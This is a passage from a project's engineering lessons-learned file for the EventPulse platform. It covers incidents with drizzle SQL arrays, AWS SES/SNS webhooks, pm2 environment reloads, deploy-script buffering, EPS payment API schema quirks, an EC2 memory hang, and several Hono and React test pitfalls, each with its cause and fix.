| INSERT-on-conflict with text[] | `sql\`INSERT ... ON CONFLICT ... DO UPDATE\`` | `tx.insert(table).values({...}).onConflictDoUpdate({ target, set: {...} })` |

**The detection rule:** any time you reach for the raw ``sql`...` `` template AND the value is a JS array AND the SQL context expects an array (right side of `ANY`/`ALL`, value for a `text[]` column, list for `WHERE col IN (...)`), STOP — switch to drizzle's builders or `inArray()`. The raw template is fine for scalars + literal SQL.

**Trail.** Day 41 PR #245 hotfix `94dab28` switched the cleanup to `inArray()`. Day 42 PR #248 switched the seed to `.insert().values().onConflictDoUpdate()` — same fix shape. Both surfaced as CI failures (Day 41) / silent zero-row insert (Day 42); the SQLSTATE 42809 + the "type of type record vs array" error message is the canonical signal.

**How to avoid.** Default to drizzle's builders for any INSERT / UPDATE / DELETE involving arrays. Reserve the raw `sql` template for SELECTs with custom-shape projections (the changelog seed's `RETURNING (xmax = 0)` is fine inside the builder via `.returning({ wasInserted: sql\`(xmax = 0)\` })` with an explicit Postgres type). If you grep for the literal `sql\`` token in a PR diff, audit any hit that mentions array-typed columns or `ANY()`.

---

## SES publishes bounce/complaint events to SNS with `eventType`, not `notificationType` (Day 40 / PR #239)

**Symptom.** Day 40 Phase 4 wiring smoke landed the SES Configuration Set + 2 event destinations + 2 SNS topics + 2 confirmed HTTPS subscriptions. Sent test emails to `bounce@simulator.amazonses.com` + `complaint@simulator.amazonses.com` via `aws sesv2 send-email --configuration-set-name eventpulse-staging`. CloudWatch confirmed SNS publishes happened (`NumberOfMessagesPublished` ticked +1 on each topic), nginx access log confirmed AWS POSTed to `/api/v1/webhooks/ses-bounce` + `ses-complaint` with the `Amazon Simple Notification Service Agent` User-Agent and the webhooks returned HTTP 200. But `email_suppression_list` stayed at 0 rows. The api log showed:

```
webhook:"ses-bounce", messageId:"5d186de2-...", msg:"webhook.ses.message_unparseable"
webhook:"ses-complaint", messageId:"3981a571-...", msg:"webhook.ses.message_unparseable"
```

The signature + topic-allowlist + cert checks all passed; the bug was inside the JSON shape check.

**Why it happens.** SES publishes bounce/complaint events to SNS in two different envelope shapes depending on the mechanism:

| Mechanism | Top-level field | Common use |
|---|---|---|
| `SetIdentityNotificationTopic` direct SNS feedback (legacy) | `notificationType: "Bounce"` / `"Complaint"` | Cited in most AWS tutorials |
| **SES Configuration Set event destinations** (Day 40 Phase 4 uses this) | `eventType: "Bounce"` / `"Complaint"` | Modern, multi-event-type mechanism with reputation metrics |

Both variants share the same nested `bounce.bouncedRecipients` / `complaint.complainedRecipients` payload shape — only the top-level field name differs.

Phase 4 PR #236 (Day 39) wrote the webhook handlers checking `notificationType` only — based on AWS documentation examples that mostly show the legacy mechanism. Day 40 wiring went through Configuration Set event destinations → field was `eventType` → `if (sesPayload.notificationType !== 'Bounce')` returned `not_a_bounce:undefined` and the suppression INSERT never ran.

**Fix.** PR #239: accept BOTH field names via a small `sesPayloadEventType()` helper in each webhook. The fix preserves forward + backward compatibility so a future SES integration on either mechanism Just Works.

```typescript
interface SesBounceMessage {
  eventType?: 'Bounce'
  notificationType?: 'Bounce'
  bounce: { ... }
}

function sesPayloadEventType(p: SesBounceMessage): string | undefined {
  return p.eventType ?? p.notificationType
}

// In the handler:
const evType = sesPayloadEventType(sesPayload)
if (evType !== 'Bounce') {
  return c.json({ ok: true, ignored: `not_a_bounce:${evType}` })
}
```

After PR #239 merged + deployed, re-running the mailbox-simulator round-trip landed both rows in `email_suppression_list` cleanly.

**How to avoid.** When wiring SES → SNS feedback in any new context, **explicitly test which envelope shape lands** before writing the type check. The two mechanisms produce subtly different payloads. The `eventType` form is what comes out of Configuration Set event destinations (the modern preferred path); `notificationType` is the legacy direct-SNS form. If unsure, accept both with the small union pattern shown above — there's no downside to the defensive shape.

**Related.** SES event publishing also supports `Delivery`, `Send`, `Reject`, `Open`, `Click`, `RenderingFailure`, `DeliveryDelay`, `Subscription` — all under `eventType`. The Phase 4 handlers only handle `Bounce` + `Complaint`; if future ops need any of the others, they'll need parallel handlers with the same dual-field shape.

---

## SNS HTTPS subscriptions default to SignatureVersion=1 (SHA1); topics must opt into v2 per-topic (Day 40)

**Symptom.** Day 40 Phase 4 wiring: created 2 SNS topics, applied the IAM topic policy for SES → SNS publish, ran `aws sns subscribe --protocol https --notification-endpoint <webhook-url>`. Both subscriptions stayed in `PendingConfirmation` state indefinitely. CloudWatch showed SNS attempted delivery — but the api log showed:

```
webhook:"ses-bounce", verify:"bad_signature_version", topicArn:"...eventpulse-ses-bounces-staging"
webhook:"ses-complaint", verify:"bad_signature_version", topicArn:"...eventpulse-ses-complaints-staging"
```

**Why it happens.** SNS topics default to `SignatureVersion=1` (legacy SHA1-RSA). The platform's `apps/api/src/infra/sns/verify-signature.ts` (Phase 4 PR #236) ONLY accepts `SignatureVersion=2` (SHA256-RSA) per current AWS recommendation:

```typescript
if (msg.SignatureVersion !== '2') {
  return { kind: 'bad_signature_version', got: msg.SignatureVersion }
}
```

This is the correct, security-conscious posture — but topics must be **opted into v2 per-topic** via `set-topic-attributes`. There is no account-level default switch; every new SNS topic creation has to be paired with a SignatureVersion=2 attribute set.

**Fix.** Set the attribute on each topic, then issue a fresh subscribe call (subscriptions in PendingConfirmation cannot be unsubscribed via the API; a fresh subscribe call generates a new pending sub that's signed with v2):

```bash
aws sns set-topic-attributes --topic-arn <topic-arn> \
  --attribute-name SignatureVersion --attribute-value 2
aws sns subscribe --topic-arn <topic-arn> --protocol https \
  --notification-endpoint <webhook-url>
```

After this, AWS sends a fresh SubscriptionConfirmation with v2 signature. The webhook accepts + auto-confirms. The original PendingConfirmation entries silently get GC'd by AWS.

**How to avoid.** Bundle the SignatureVersion=2 set into the **same step as topic creation** — pair every `create-topic` with a `set-topic-attributes SignatureVersion=2`. Or accept v1 alongside v2 in `verify-signature.ts` (less secure; not recommended). Update the runbook `docs/runbooks/sns-bounce-complaint-aws-wiring.md` to include this as step 1.x — it's currently missing.

**Related.** The Phase 4 PR #236 verify-signature.ts JSDoc explicitly says "We only accept version 2 per current AWS recommendation" — the runbook should have flagged that this requires a topic-attribute opt-in. Day 40 EOD playbook bump: add the missing step to the runbook.

---

## `pm2 reload --update-env` only sees env vars from the parent shell — must `set -a; source .env.staging; set +a` first (Day 40)

**Symptom.** Day 40 Phase 4 step 1.5: appended `SES_BOUNCE_TOPIC_ARNS` + `SES_COMPLAINT_TOPIC_ARNS` to `/home/eventpulse/.env.staging`, then ran `sudo -u eventpulse pm2 reload api --update-env` via SSM `AWS-RunShellScript`. The api process reloaded zero-downtime and `/health` stayed green. But probing the webhook with a TopicArn matching the new env var still returned `verify:"topic_not_allowed"` from `verify-signature.ts` — meaning the new env var wasn't loaded in the api process. Probing `/proc/<api-pid>/environ` confirmed the new vars were absent.

**Why it happens.** The api process does NOT use `dotenv` or any in-app `.env` file loader. The `pm2/ecosystem.config.cjs` only declares `NODE_ENV` + `PORT` in `env`, NOT an `env_file` directive. Instead, the env loading happens in `infra/deploy/deploy.sh:49`:

```bash
set -a; source "$ENV_FILE"; set +a
...
$PM2 reload "$APP_DIR/pm2/ecosystem.config.cjs" --update-env
```

The `set -a` auto-exports every variable subsequently sourced. `pm2 reload --update-env` then reads the env from the **invoking shell's environment** and injects it into the restarted process.

When SSM `AWS-RunShellScript` runs each command in a fresh shell, the invoking shell starts CLEAN — no env vars from `.env.staging` are sourced. Running `pm2 reload --update-env` in that fresh shell sees only the SSM-injected env (basically `PATH`, `HOME`, AWS region) and tries to inject THAT into the api process. pm2's daemon happens to fall back to whatever env vars pm2 already had cached for the api process at original spawn, which is why critical invariants (`STAGING_PAYMENT_BLOCK`, `EPS_MODE`, etc.) were preserved — but new vars from the file go nowhere.

**Fix.** Mirror deploy.sh's pattern in the same shell that runs the reload:

```bash
sudo -u eventpulse bash -c '
  set -a
  source /home/eventpulse/.env.staging
  set +a
  pm2 reload api --update-env
'
```

The `sudo -u eventpulse bash -c '...'` wraps the source + reload in ONE bash invocation as the `eventpulse` user. Inside that bash, the env is freshly sourced from the live file and the reload propagates everything to the new api process.

**How to avoid.** When editing env vars on a long-running EC2 outside of a deploy.sh run, always invoke pm2 reload via the source-then-reload pattern above — never just `pm2 reload --update-env` alone. The deploy.sh source-first idiom is the load-bearing pattern; reproducing it in any ad-hoc env-change workflow is required for new vars to actually propagate.

**Verification probe.** After the source-then-reload, confirm the new vars are live by reading `/proc/<api-pid>/environ` (the kernel-published env for the running process) and grepping for the new var names. If the var is missing from `/proc/.../environ` but present in `.env.staging`, the reload didn't propagate — re-do the wrap.

**Related.** This also explains why pre-existing critical invariants survived a botched `pm2 reload --update-env` — pm2's daemon caches them across reloads. The api process maintains continuity on the invariants set at original spawn time even if subsequent reloads supply incomplete env. **This is fragile.** A second reload that succeeds (and replaces the cached env) without sourcing would WIPE the critical invariants. Always source.

---

## `deploy.sh` edits don't execute on the deploy that ships them — bash buffers the script (2026-06-01 / Day 39 PM / PR #237)

**Symptom.** PR #237 added a new "4.1) Idempotent seeds (post-migrate, pre-pm2-reload)" block to `infra/deploy/deploy.sh` invoking `db:seed:legal-documents` + `db:seed:buyer-terms-v1` between `db:migrate` and `pm2 reload`. After the squash-merge to main (`6e54f34`), deploy completed SUCCESS — `/health` returned 200, pm2 reloaded both api + web — but the smoke check `GET /api/v1/public/legal/by-url-path?path=/buyer-terms` returned `404 DOCUMENT_NOT_FOUND`. The deploy log showed `migrations complete: 1 applied, 14 already in place` jumping STRAIGHT to `no nginx vhost changes; skipping nginx reload`, **completely missing the seed-step output** (the seed's own `console.log('buyer-terms v1.0: seeded (X bytes HTML…)')` line was nowhere in the log).

**Why it happens.** `deploy.sh` runs as a long-running bash process. Step 1 of the script does `git reset --hard origin/main` to fetch the merged code. This **updates `deploy.sh` on disk** to the new version (with the seed lines). But the **already-running bash process** has the OLD `deploy.sh` content loaded into its memory and continues executing from that buffer — bash reads short scripts as a single chunk at process start, and for chunks already loaded, the on-disk change has no effect on the running invocation. Result: the deploy.sh that EXECUTES on the deploy that SHIPS the change is the prior version — it has the same migrate + pm2 reload as before, NO seed step. The new seed step only executes starting from the **next** deploy, when bash loads the now-on-disk new `deploy.sh` from scratch.

This is bash's expected (if surprising) behavior. POSIX shells permit (but don't require) re-reading scripts on disk-change; bash's optimization buffers small scripts entirely at start, large scripts in chunks. `deploy.sh` is small enough to land entirely in the first chunk.

**Fix (one-shot recovery on the deploy that ships the change).** Run the new step manually via SSM. For PR #237:

```bash
aws ssm send-command \
  --instance-ids i-02e4fddeb923c14f9 \
  --document-name AWS-RunShellScript \
  --comment "bootstrap-seed-buyer-terms-v1" \
  --parameters 'commands=["cd /home/eventpulse/app && sudo -u eventpulse env PATH=/home/eventpulse/.local/share/pnpm:/home/eventpulse/.nvm/versions/node/v22.21.0/bin:/usr/bin:/bin DATABASE_URL=$(sudo -u eventpulse grep ^DATABASE_URL /home/eventpulse/.env.staging | cut -d= -f2-) pnpm --filter @eventpulse/api db:seed:buyer-terms-v1"]' \
  --profile eventpulse --region ap-southeast-1
```

Then re-run the smoke check to confirm. PR #237 fix: seed ran cleanly via SSM, `12104 bytes HTML cached`, `GET /buyer-terms` returned `version=v1.0` with all four Salehin signature markers (`পরোক্ষ ক্ষতি`, `Clause 6.2`, `Continue with bKash`, `প্রতারণামূলক উপস্থাপনা`) present in body_html.

**How to avoid.** When adding a critical post-migrate step to `deploy.sh` (e.g. a seed):

1. Plan TWO deploys: the first deploy ships the new `deploy.sh` content (but doesn't run the new step); the second deploy exercises it naturally because bash loads the on-disk new file from scratch.
2. OR plan a manual SSM one-shot during the same merge session for bootstrap recovery (this is what we did for PR #237).
3. OR restructure: put the new step in a **separate** script that `deploy.sh` invokes via `bash /path/to/new-step.sh` rather than inline. The exec'd subprocess loads the new script fresh.

The next deploy (whenever it lands) will naturally execute the new seed lines because the on-disk `deploy.sh` is correct. This gotcha is one-time-per-deploy.sh-edit; subsequent deploys to the same shape are fine.

**Counter-example that doesn't hit this.** Changes to files INVOKED by deploy.sh (like new migration files, new seed scripts referenced via `pnpm db:seed:X`, new code under `apps/api/dist/`) are picked up immediately because deploy.sh INVOKES them after the `git reset --hard` — the invocation reads the file fresh from disk at exec time. Only deploy.sh edits ITSELF face this gap.

**Related.** Similar pattern exists for any long-running script that mutates its own backing file. Convention: put the volatile inline logic into a helper script that deploy.sh invokes via `bash /path/to/helper.sh` so each helper invocation is a fresh fork-and-exec. Long-term consideration for `infra/deploy/`: factor sub-steps into helper scripts so future edits don't replay this gotcha.

---

## Conventional-commits CI check rejects PR titles >100 chars (after the `type(scope): ` prefix) (2026-05-31 / Day 37 / PR #223)

**Symptom.** PR #223's title `feat(eps): V5 production additive-field schema tolerance (EpsTransactionId + PaymentReferance + StoreAmount optional)` failed the **"PR title is Conventional Commits"** CI check on first run with no other explanation. All other checks (8 of 8) were green. The failure surfaced only after the PR opened and CI ran — the local `commitlint` pre-commit hook did not catch it because pre-commit lints the commit-message subject line, while the CI check lints the **PR title** which `gh pr create --title` populated from the operator-provided prompt verbatim (109 chars).

**Why it happens.** The repo's CI config enforces `subject-max-length: 100` chars on the PR title's subject portion (everything after the `type(scope): ` prefix). 109-char subject → rejected. The check is `.github/workflows/*.yml` driven; it runs against the PR title at every `synchronize` + `opened` event. There is no warning for borderline lengths — pass-or-fail only.

**Fix.** Rename the PR via `gh pr edit <num> --title "<new-title>"`. Subject ≤100 chars. CI re-runs automatically on the title-change event. PR #223 fix: shortened to `feat(eps): V5 production schema accepts EpsTransactionId + PaymentReferance + StoreAmount` (89 chars). Result: all 8 checks green, merged successfully.

**Counted both ways:**

- The CI rule limits the **subject** (the text after `type(scope): `). Full PR title that landed = `type(scope): ` (≤30 chars typically) + subject (≤100 chars) = ≤130 chars total acceptable.
- The rejected 109-char subject example: `V5 production additive-field schema tolerance (EpsTransactionId + PaymentReferance + StoreAmount optional)` — 109 chars after the colon-space.

**How to avoid.** When drafting PR titles, count the subject (post-`type(scope): ` portion) and keep it ≤100 chars. Squash-merge commit subjects inherit the PR title at merge-time — a long PR title produces a long squash-commit subject, which then bumps against any downstream tooling assuming the same 100-char convention. For verbose scope descriptions, push detail to the PR body — title gets the canonical short label, body gets the full named-field list. Pre-existing CLAUDE.md §23.5 conventional-commits format gives "feat(scope): short summary" which most observed examples respect comfortably under 100 chars; the 109-char failure was a one-off where the prompt's verbose field-naming requirement was preserved into the title instead of compressed.

**Related.** This is **PR-title-only**, not commit-message-only. The local commitlint pre-push hook still catches subject-line violations on the source commits (which were short — under 60 chars each on the multi-commit branch). The CI check is a parallel layer specifically on the GitHub PR title, which is generated by `gh pr create --title` or the GitHub UI, not by the commit messages themselves.

---

## EPS V4 sandbox Verify returns null ErrorMessage + null ErrorCode on success (Postman/guide samples are wrong) (2026-05-30 / Phase 1.4c)

**Symptom.** PR #218 shipped a V4 Verify schema with `ErrorMessage: z.string().optional()` per the EPS V4 Postman collection and integration guide (which showed `""`). The first live Verify run against the EPS sandbox returned HTTP 200 with a valid response body — but our schema rejected it. PR #217's diagnostic surfaced: `ErrorMessage: null` and `ErrorCode: null` on the success envelope. All 4 truth-gate verify calls blocked.

**Why it happens.** EPS sandbox returns `null` for both error fields on a successful transaction; the V4 Postman + integration guide samples show empty strings (`""`). The doc is wrong (or at minimum, divergent from the live sandbox). Don't trust the doc-published shape over the live shape when the schema accepts only one.

**Fix.** Use `z.union([z.string(), z.null()]).optional()` for both `ErrorMessage` and `ErrorCode` in V4VerifyResponseSchema (and any field documented as "always present" — empty-string-vs-null is the most likely sandbox vs guide drift). PR #219 shipped this. Pin both null-shape AND empty-string-shape acceptance in tests so a future "tighten the schema" PR can't regress.

**How to avoid.** When wiring any third-party schema, even when the vendor's Postman collection appears authoritative: write the test against the **live response shape** the moment you have one, and treat the vendor doc as a starting point that may not match reality. Run-truth-gate's diagnostic (PR #217) was the load-bearing instrument that surfaced this within minutes — keep diagnostic logging on schema-validation failures permanently; do not optimise it away.

**Related discoveries (same Verify response).** The V4 sandbox Verify success envelope also publishes `StoreAmount` — see "EPS Verify publishes StoreAmount" entry below.

---

## EPS V4 Verify publishes StoreAmount — pure eps_fee derivation is mode-agnostic (2026-05-30 / Phase 1.4c)

**Symptom.** The original truth-gate derivation `eps_fee_paisa = TotalAmount_paisa − subtotal_paisa` had structural blind spots: Mode A conflated platform+EPS combined, Modes B + D absorbed EPS-fee on the buyer side and the derivation returned 0 (B) or platform_fee-only (D). Only Mode C directly yielded pure eps_fee. The §14.2 / Decision-N target — verify EPS's actual EPS-fee per mode — was unreachable for half the modes through this rule.

**Why it happens.** The V4 sandbox Verify envelope publishes both `TotalAmount` (what EPS captured from buyer) AND `StoreAmount` (what EPS will settle to the merchant after deducting its own gateway fee). The doc example we modelled the schema after only mentioned `TotalAmount`. The live response has BOTH.

**Fix.** Adopt the mode-agnostic derivation:

```text
eps_fee_paisa = parseBdtDecimalToPaisa(TotalAmount)
              − parseBdtDecimalToPaisa(StoreAmount)
```

Every mode yields pure eps_fee directly from EPS's authoritative split, independent of absorb/pass-through composition. The Mode-B/D blind spots disappear; the Mode-A combined-fee conflation disappears. PR #219 shipped this. `extractEpsFeePaisa(raw)` lost its `scenario` arg (no longer needed).

**How to avoid.** When deriving a quantity from an external API response, before adopting a derived rule that only works in some cases, dump the full live response shape and **check whether the quantity is reported directly**. PR #217's diagnostic surfaced StoreAmount within minutes of the first live Verify call — would have been invisible if we'd cherry-picked TotalAmount-only out of the response shape based on doc skimming.

**V5 production caveat.** The V5 production integration guide example does NOT show StoreAmount; the doc example is minimal (and also missing the documented `EpsTransactionId`). Schema MUST make StoreAmount optional in both V4 sandbox and V5 production response schemas; if present → use the (T − S) rule; if absent → fall back to (TotalAmount − subtotal) WITH a clear runtime log line indicating which derivation path is active. Production smoke (BDT 100) is the empirical confirmation point. Decisions.md 2026-05-30 entry tracks this.

---

## EPS uses "PaymentReferance" (NOT "PaymentReference") in V5 Verify response — match character-for-character in schema (2026-05-30 / Phase 1.4c)

**Symptom.** N/A in code yet (V5 production schema not extended yet — this is a forward-looking gotcha captured from the V5 production integration guide before it bites us). Will manifest as a missing field on the V5 production response when we add it to the schema, if we silently correct the typo to "Reference".

**Why it happens.** EPS's V5 production integration guide spells the field `PaymentReferance` (with two A's instead of "Reference"). Their server emits exactly that spelling; a `PaymentReference` field name would never match.

**Fix.** When extending V5VerifyResponseSchema for the production additive fields (next follow-up PR), match EPS's typo character-for-character: `PaymentReferance: z.string().optional()`. Do NOT correct it in our schema. Add an inline code comment pointing at the EPS V5 doc so a future "spelling fix" PR doesn't quietly break it.

**How to avoid.** Treat vendor field names as strings to copy-paste, never as words to interpret. If a field name looks misspelled, copy it verbatim from the live response (or the vendor doc) — never retype.

---

## Staging EC2 (t3.small, 2GB, no swap) went unreachable mid-session — in-VM hang under the full stack (2026-05-25 / Day 33 incident)

**Symptom.** Mid-Day-33-Phase-4-EOD-smoke, the staging EC2 became unreachable:

- TCP 443 to all 5 vhosts: 10s timeout (`curl: (28)`)
- SSM Agent: `ConnectionLost`, `LastPingDateTime` frozen
- The Phase 3 deploy's SSM `SendCommand` was marked `Undeliverable` (never reached the EC2)
- BUT: EC2 hypervisor still reported `running`, InstanceStatus `ok`, SystemStatus `ok` — both reachability checks passed

The combination is **the canonical "in-VM hang" signature** — the hypervisor sees the VM alive, but the OS/services inside are unresponsive (kernel hung, OOM-killer cascade, network-interface state flipped, etc.).

**Hardware reality of staging:** `t3.small` (2 vCPU, **2 GB RAM**, **no swap**) running the full stack:

- Next.js production server (web, ~120 MB resident)
- Hono API server (api, ~120 MB resident)
- Postgres 16 (`postgresql@16-eventpulse_staging`)
- Redis 7 (multiple connections: pool + BullMQ-dedicated)
- BullMQ delivery worker (Day 28+)
- Nginx, SSM agent, CloudWatch agent

Steady-state idle: ~600 MB used (3-quarter free per `free -h` post-recovery). But peaks during deploys (`pnpm install` + `pnpm build` of two TypeScript codebases + 3 packages) compound with already-running pm2 processes — the build's transient memory headroom can spike well past the 1.4 GB available, and with **zero swap** Linux's only option is OOM-killer.

**The cascade.** If OOM-killer takes out a load-bearing process (kernel daemon, init system, networking stack), the VM can wedge — TCP 443 stops responding, SSM Agent stops heartbeating. Post-reboot evidence is gone because `dmesg` clears on reboot (no persistent OOM log; would need `journalctl --boot=-1` from PRIOR boot, which isn't always available either).

**Recovery sequence (what happened on Day 33):**

1. STOP-ASK fired (port 443 dead + SSM dead + hypervisor healthy = exact signature)
2. **First "Reboot" via console DID NOT FIRE** — graceful reboot is ACPI-based; the hung OS can't process the shutdown signal. EC2 API showed `LaunchTime` unchanged for 10+ min after the reboot was issued; SSM `LastPingDateTime` also unchanged.
3. **Stop + Start (NOT just Reboot)** is the fix when the VM is truly hung. The hard stop terminates the VM at the hypervisor; the start fires a fresh boot. Both timestamps update.
4. Post-recovery, the web pm2 process was in a crashloop (130+ restarts, 100% CPU) because `.next` build directory was missing. The Phase 3 deploy's `pnpm build` step regenerated it; pm2 reload healed the crashloop.
5. The deploy workflow's SSM waiter timed out (~100s default) before the build completed (build takes >100s on t3.small with cold pnpm cache). The SSM command itself succeeded; only the GitHub Action's wait wrapper failed. Verified by reading `aws ssm get-command-invocation` directly → `Status: Success, [...] deploy ok ref=f5012982...`.

**Fix.**

- Recovery: **Stop + Start, not Reboot**, when port 443 + SSM are both dead but hypervisor is healthy. Graceful reboot on a hung OS just queues a shutdown that never fires.
- Verify recovery via `aws ec2 describe-instances` (`LaunchTime` updates on Start) + `aws ssm describe-instance-information` (`PingStatus: Online`, `LastPingDateTime` advances) + sustained TCP 443 (3 consecutive responses, not 1 — the boot can flap).
- If the web pm2 process crashloops on missing `.next`, run the deploy (it does `pnpm build`); avoid manual `pnpm build` over SSM which can hit the same memory ceiling that caused the hang.

**How to avoid (root cause + follow-up).**

The 2 GB RAM with no swap is the root cause. The next-cheapest fix:

1. **Add swap (cheap, today-able).** A 2 GB swapfile is `dd if=/dev/zero of=/swapfile bs=1M count=2048 && mkswap /swapfile && swapon /swapfile`. Costs zero. Adds memory headroom for transient build spikes. Recommended as the immediate mitigation.
2. **Upgrade staging EC2 to t3.medium (4 GB RAM, ~+$15/mo).** Long-term fix; gives real headroom under the full stack + concurrent deploys.
3. **Split workers off the API process group.** BullMQ delivery worker on a separate pm2 process (already shipped as separate `cron` slot in §17.5 ecosystem plan, but on staging they share a process tree currently).
4. **Monitoring.** CloudWatch Agent memory metrics + alarm at >85% sustained → alert before OOM. (Currently we have CW Agent reporting CPU/mem; no alarm wired.)

**Carry to Day 34 (handoff.md prominently):** decide between (1) swapfile-now or (2) t3.medium-upgrade. Either fixes the immediate risk; (2) is more durable. Add a small CloudWatch memory alarm regardless.

**UPDATE 2026-05-26 (Day 34 Phase 0).** Stopgap (1) applied: 2 GB swap file at `/swapfile` + `vm.swappiness=10`, both persistent + codified in [`infra/scripts/bootstrap-staging.sh`](../../infra/scripts/bootstrap-staging.sh) step 0.0 so a fresh EC2 rebuild reproduces. Recovery procedure documented in [`docs/runbooks/staging-bootstrap.md`](../../docs/runbooks/staging-bootstrap.md) "Recovering from an in-VM hang". Decision rationale + t3.medium pre-production flag + CW alarm follow-up in [`decisions.md`](decisions.md) "2026-05-26 · Sprint 4 Day 34 Phase 0 — Staging EC2 swap stopgap; t3.medium flagged as pre-production capacity decision". Item (2) **still open** as a pre-production capacity decision for Moshiur; item (4) CW memory alarm **still open** (small AWS-write follow-up).

**Cross-references:**

- `progress.md` "Day 33 incident" carry-forward.
- `handoff.md` Day-34 first-thing item.
- `decisions.md` 2026-05-26 entry (mitigation + t3.medium flag).
- `infra/scripts/bootstrap-staging.sh` step 0.0 (codified swap).
- `docs/runbooks/staging-bootstrap.md` "Recovering from an in-VM hang" + "Memory headroom — 2GB swap".
- §17.2 (EC2 spec — t3.small was the "$40/mo canary" staging size; revisit).
- §17.11 (Monitoring — CW Agent ships memory metrics; alarm not wired).

---

## React `react/no-unescaped-entities` blocks bare apostrophes in JSX text (2026-05-25 / Day 33 Phase 3 hotfix)

**Symptom.** Day 33 Phase 3 PR shipped with the words `you're` (twice — page header copy + component card hint) in JSX text. CI lint job failed:

```text
./src/components/tenant/payouts-view.tsx
  91:18  Error: ` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`.  react/no-unescaped-entities
```

The E2E Playwright job ALSO failed because `next build` runs `next lint` and fails on the same rule. All other Phase 3 checks passed (unit tests, integration, build, CodeQL).

**Why it happens.** Next.js's default ESLint config enables `react/no-unescaped-entities`, which flags raw `'`, `"`, `>`, `}` in JSX text as ambiguous (could be parser-confusing, especially in code that mixes JSX + string literals). The fix is one of `&apos;`, `&#39;`, `&lsquo;`, `&rsquo;` (or rewriting without contraction). Default behavior, not a project-specific config.

**Why we never hit this before Day 33:** The Day-32 attendees page + Day-32 CSV export UI + Day-33 dashboard page + dashboard card copy all happened to avoid contractions. Phase 3 was the first surface to use possessive contractions in copy ("Net you're owed", "What you're owed").

**Fix.** `you're` → `you&apos;re`. Two-character change per occurrence.

**How to avoid.** When writing UI copy with contractions:

- Use `&apos;` in JSX text (the React-recommended HTML entity).
- OR rewrite without the contraction ("Amount owed to you" instead of "What you're owed").
- Running `pnpm --filter @eventpulse/web lint` locally would catch this before CI — worth adding to the pre-push hook if it becomes a recurring stub. For now, treat as a known one-line CI cycle.

**Cross-references:** `decisions.md` "Sprint 4 Day 33" PR #190 hotfix entry; commit `a572c8e`.

---

## WHATWG `Response.text()` strips a leading UTF-8 BOM during decoding (2026-05-25 / Day 32 Phase 3 hotfix)

**Symptom.** Phase 3 CSV export shipped with UTF-8 BOM (`\xEF\xBB\xBF`) at the start of the body so Excel-on-Windows opens Bangla attendee names correctly. Integration test asserted `expect(body.startsWith('﻿')).toBe(true)` against `await res.text()`. CI Integration + RLS job failed: `expected false to be true`. All other Phase 3 checks (unit tests, Playwright e2e, typecheck, lint, build, CodeQL) passed.

**Why it happens.** The WHATWG fetch spec's `Response.text()` decodes the body as UTF-8 and consumes a leading BOM as an encoding marker (not as content). It is by-spec behaviour, not a bug — the BOM tells the decoder "this is UTF-8", and the decoder eats the marker. The exact byte sequence `\xEF\xBB\xBF` IS on the wire; `text()` just doesn't surface it.

This is consistent across Node 18+ fetch, undici, browser fetch, and Hono's response wrapper.

**Fix.** Verify BOMs via `arrayBuffer()`, not `text()`:

```ts
const buf = new Uint8Array(await res.arrayBuffer())
expect(buf[0]).toBe(0xef)
expect(buf[1]).toBe(0xbb)
expect(buf[2]).toBe(0xbf)
const body = new TextDecoder('utf-8').decode(buf) // BOM-aware; use only AFTER the byte assertion
```

The service code (which writes the BOM byte-sequence as the first character of the CSV string) is unchanged and correct. The test was looking at the post-decoder view; the wire bytes are what matter for Excel-on-Windows.

**How to avoid.** Any test that asserts on encoding markers (BOM, byte-order mark, or any control-byte sequence that decoders may consume) MUST read the response as `ArrayBuffer` and assert on bytes directly. `text()` is the wrong tool for byte-level assertions.

**Cross-references:** `decisions.md` "Sprint 4 Day 32" Choice A (CSV export with UTF-8 BOM is the load-bearing format detail for Excel-on-Windows Bangla rendering); commit `84ac4ff` (the hotfix).

---

## Hono middleware that hashes request body MUST use `c.req.raw.clone().text()`, NOT `c.req.text()` (2026-05-25 / Day 29 Phase 1 hotfix #1)

**Symptom.** Day 29 Phase 1 idempotency middleware shipped with `await c.req.text()` for body hashing. All 12 unit tests against `app.request()` passed. Production smoke after deploy returned plain-text "Internal Server Error" (not the route handler's typed 4xx envelope) for any POST with a non-trivial body.

**Why it happens.** Standard Web API: a `Request` body is a `ReadableStream` that can be consumed ONCE. Hono's `c.req.text()` reads the underlying Request's body stream → consumes it. Downstream `zValidator('json')` calls `c.req.json()` which tries to read the same stream → empty → `JSON.parse` throws → Hono's default `onError` catches the throw and returns generic 500 plain text.

The unit tests didn't catch this because `app.request()` in Hono shortcuts internal caching — the same code reads fine in `app.request()` but breaks under real HTTP traffic served by `@hono/node-server`. Different code path, different stream behaviour.

**Fix.** `await c.req.raw.clone().text()`. The `.raw` accessor returns the underlying standard `Request` object; `.clone()` is the Web-API standard that returns a clone with its own body stream. Reading from the clone hashes the bytes without consuming the original stream that downstream consumers need.

**How to avoid.**

1. Any Hono middleware that needs to read the request body MUST use `c.req.raw.clone().text()` (or `.arrayBuffer()`).
2. Any HTTP-touching middleware change needs a post-deploy live curl smoke as part of the merge gate. Mock-based unit tests with `app.request()` are a BLIND SPOT for real HTTP behaviour.

---

## Redis singleton needs explicit warm-up at boot or first request after pm2 reload races the lazy-connect (2026-05-25 / Day 29 Phase 1 hotfix #2)

**Symptom.** After Day 29 Phase 1 body-clone hotfix (#172) deployed, production smoke STILL returned plain-text "Internal Server Error" on the FIRST request after pm2 reload. EC2 stderr revealed the real second issue:

```text
Error: Stream isn't writeable and enableOfflineQueue options is false
  at EventEmitter.sendCommand (ioredis/built/Redis.js:365:32)
  at EventEmitter.get (ioredis/built/utils/Commander.js:90:25)
  at <anonymous> (apps/api/src/middleware/idempotency.ts:245:37)
```

**Why it happens.** The Redis singleton at `apps/api/src/infra/redis/client.ts` uses `lazyConnect: true` + `enableOfflineQueue: false` (Day 26 design — fail-fast for the EPS token-cache hot path; a slow Redis can't hang token fetches indefinitely). Without explicit warm-up, the FIRST request after pm2 reload races the deferred connect: ioredis throws synchronously before the socket opens, the consumer's `redis.get()` rejects with `"Stream isn't writeable"`, Hono returns generic 500.

This is the SECOND time the same root issue (unit-tests-vs-production-HTTP gap) bit Day 29 Phase 1. Unit tests inject mock Redis via `_setRedisClientForTest` BEFORE the singleton ever constructs — they don't exercise the lazy-connect race.

**Fix.** In `apps/api/src/index.ts` after `const redis = getRedis()`:

```typescript
void redis.connect().catch((err) => {
  logger.warn({ err: err.message }, 'redis.warmup_failed_at_boot')
})
```

